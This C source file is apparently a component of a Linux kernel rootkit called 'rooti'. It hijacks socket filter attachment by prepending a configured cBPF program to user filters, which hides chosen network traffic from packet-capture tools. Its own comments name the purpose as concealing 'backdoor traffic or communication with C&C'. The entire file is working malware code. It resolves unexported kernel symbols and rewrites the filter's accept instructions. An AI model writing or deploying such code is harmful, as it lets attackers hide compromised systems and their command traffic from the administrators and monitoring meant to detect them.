#include <linux/socket.h>
#include <linux/filter.h>
#include "traffic.h"
#include "../../utils.h"
#include "../../config.h"

/*
    Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
    to the start of the user-defined BPF program (e.g 'program_offset').
*/
static void rooti_replace_ret_instructions(struct sock_fprog_kern *filter_program, loff_t program_offset)
{
    for (int i = 0; i < program_offset; i++) {
        if (BPF_CLASS(filter_program->filter[i].code) != BPF_RET) { continue; }
        if (filter_program->filter[i].k == 0) { continue; }

        loff_t jmp_offset = program_offset - (i + 1);
        filter_program->filter[i].code = BPF_JMP | BPF_JA;
        filter_program->filter[i].jt = 0;
        filter_program->filter[i].jf = 0;
        filter_program->filter[i].k = jmp_offset;
    }
}

/*
    Concatenate two source BPF filter programs into one by ANDing the filters they represent.
    Saves the result into the filter 'dst_program' which is heap-allocated and should be freed later.
*/
static int rooti_concat_filter_programs(struct sock_fprog_kern *src_program1, struct sock_fprog_kern *src_program2,
                                        struct sock_fprog_kern *dst_program)
{    
    dst_program->len = src_program1->len + src_program2->len;
    dst_program->filter = kcalloc(dst_program->len, sizeof(struct sock_filter), GFP_KERNEL);
    if (dst_program->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    memcpy(dst_program->filter, src_program1->filter, bpf_classic_proglen(src_program1));
    memcpy(dst_program->filter + src_program1->len, src_program2->filter, bpf_classic_proglen(src_program2));

    // Replace ret instructions of the 'accept path' with a jump to the start of the user program
    rooti_replace_ret_instructions(dst_program, src_program1->len);

    return 0;
}

/* 
    Copies the userspace BPF filter program pointed to by 'fprog_ptr' into the parallel kernelspace structure.
    The filter of the kernel structure is heap-allocated and should be freed later.
*/
int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, sockptr_t fprog_ptr, int fprog_len)
{
    struct sock_fprog user_fprog;
    size_t user_program_size;
    int err;

    err = copy_bpf_fprog_from_user(&user_fprog, fprog_ptr, fprog_len);
    if (err) {
        ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
        return err;
    }

    user_fprog_kernel->len = user_fprog.len;
    user_fprog_kernel->filter = kcalloc(user_fprog_kernel->len, sizeof(struct sock_filter), GFP_KERNEL);
    if (user_fprog_kernel->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    user_program_size = bpf_classic_proglen((&user_fprog));
    err = copy_from_user(user_fprog_kernel->filter, user_fprog.filter, user_program_size);
    if (err) {
        ROOTI_DEBUG("copy_from_user() failed: %d", err);
        return -EFAULT;
    }

    return 0;
}

/*
    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
    to the filters specified by the user. This is used to conceal certain network traffic that we wish to hide,
    such as backdoor traffic or communication with C&C.
*/
int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_filter_program)
{
    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);

    struct sock_fprog_kern kern_filter_program = {
        .filter = ROOTI_BPF_FILTER_PROGRAM,
        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
    };
    struct sock_fprog_kern complete_filter_program;
    struct bpf_prog *bpf_program;
    int err;

    if (kern_filter_program.len > 255) {
        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
        return -EINVAL;
    }

    err = rooti_concat_filter_programs(&kern_filter_program, user_filter_program, &complete_filter_program);
    if (err) {
        return err;
    }

    err = bpf_prog_create(&bpf_program, &complete_filter_program);
    if (bpf_program == NULL) {
        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
        return err;
    }

    err = ____sk_attach_prog(bpf_program, sock);
    if (err) {
        bpf_prog_destroy(bpf_program);
        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
        return err;
    }

    kfree(complete_filter_program.filter);

    return 0;
}